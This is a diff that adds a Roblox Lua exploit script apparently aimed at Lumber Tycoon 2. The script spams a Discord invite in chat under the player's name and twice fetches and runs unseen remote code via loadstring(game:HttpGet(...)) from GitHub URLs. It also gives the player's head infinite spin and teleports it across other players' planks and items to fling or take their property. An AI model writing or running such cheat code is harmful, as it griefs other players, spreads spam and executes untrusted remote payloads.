@@ -1,0 +1,93 @@
+workspace.Effects:Destroy()
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Join us! Were fixing the economy in this game because of Exploiters, Join this to complain: discoard.gg/gBqpjEyT3N (without 'a') Sirency, "..game.Players.LocalPlayer.Name,"All")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dymen123/FLING/main/balls.txt", true))();
+task.wait(10)
+for i = 1, 4 do
+    task.wait()
+    local AngularVelocity = Instance.new("AngularVelocity", workspace[game.Players.LocalPlayer.Name].Model.Head)
+    AngularVelocity.AngularVelocity = Vector3.new(math.huge, math.huge, math.huge)
+    AngularVelocity.MaxTorque = math.huge
+end
+for i = 1,3 do
+    for i,v in pairs(workspace.PlayerModels:GetChildren()) do
+        for i,d in pairs(v:GetDescendants()) do
+            if d.Name == "DraggableItem" or d.Name == "Plank" then
+                if d.Parent.Name ~= "Hitch" and d.Parent.Name ~= "WorkLight" then
+                    if d.Parent.Name == "Plank" then
+                        print("plank")
+                        for i,m in pairs(d.Parent:GetChildren()) do
+                            if m:IsA("Part") or m:IsA("MeshPart") then
+                                for i = 1,50 do
+                                    if d and d.Parent then
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Position = d.Parent.WoodSection.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.BodyPosition.Position = d.Parent.WoodSection.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.Position = d.Parent.WoodSection.Position
+                                        task.wait()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    if d.Name == "DraggableItem" and d.Parent.Name ~= "Model" then
+                        print("no plank")
+                        for i,m in pairs(d.Parent:GetChildren()) do
+                            if m:IsA("Part") or m:IsA("MeshPart") then
+                                for i = 1,50 do
+                                    if d and d.Parent then
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Position = d.Parent.Main.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.BodyPosition.Position = d.Parent.Main.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.Position = d.Parent.Main.Position
+                                        task.wait()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+for i = 1,3 do
+    for i,v in pairs(workspace.PlayerModels:GetChildren()) do
+        for i,d in pairs(v:GetDescendants()) do
+            if d.Name == "DraggableItem" or d.Name == "Plank" then
+                if d.Parent.Name ~= "Hitch" and d.Parent.Name ~= "WorkLight" then
+                    if d.Parent.Name == "Plank" then
+                        print("plank")
+                        for i,m in pairs(d.Parent:GetChildren()) do
+                            if m:IsA("Part") or m:IsA("MeshPart") then
+                                for i = 1,25 do
+                                    if d and d.Parent then
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Position = d.Parent.WoodSection.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.BodyPosition.Position = d.Parent.WoodSection.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.Position = d.Parent.WoodSection.Position
+                                        task.wait()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    if d.Name == "DraggableItem" and d.Parent.Name ~= "Model" then
+                        print("no plank")
+                        for i,m in pairs(d.Parent:GetChildren()) do
+                            if m:IsA("Part") or m:IsA("MeshPart") then
+                                for i = 1,25 do
+                                    if d and d.Parent then
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Position = d.Parent.Main.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.BodyPosition.Position = d.Parent.Main.Position
+                                        workspace[game.Players.LocalPlayer.Name].Model.Head.Attachment.AlignPosition.Position = d.Parent.Main.Position
+                                        task.wait()
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/lnkyDev/ServerAPI/main/API")()
+task.wait(1)
+module:Teleport(13822889)
